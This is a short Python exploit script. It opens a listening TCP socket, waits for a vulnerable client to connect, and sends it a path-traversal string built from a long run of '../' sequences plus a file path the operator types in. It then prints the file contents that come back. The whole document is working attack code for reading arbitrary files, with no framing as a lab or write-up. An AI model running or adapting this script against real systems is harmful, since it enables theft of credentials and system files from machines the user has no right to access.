#!/usr/bin/python3
import socket
import sys
import time

# Checking arguments
if (len(sys.argv) != 2):
    print("[*] Usage " + sys.argv[0] + " <local_port>\n")
    exit(0)

# Variables
host = '0.0.0.0'
port = int(sys.argv[1])
buff_size = 1024
path_prefix = "../../../../../../../../.."
output = ""

# Setup listening TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen()
print("[*] Listening on " + host + " port " + str(port))
conn, address = s.accept()
print(f"[*] Connection from {address}\n")

# Send/receive data
try:
    readfile = input("Enter a full pathname and file: ")
    path_trav = path_prefix + readfile
    print("\n[*] Sending string: " + path_trav)
    conn.sendall(bytes(path_trav, 'utf8'))
    time.sleep(1)
    conn.shutdown(socket.SHUT_WR)

    # Loop until receiving buffers are cleared
    while True:
        data = conn.recv(buff_size)
        if not data:
            break
        output += data.decode()
    
    print("[*] Output:\n")
    print(output)
    print("[*] Connection closed.")
except socket.error as e:
    print("[!] Error occured: " + str(e))
finally:
    conn.close()

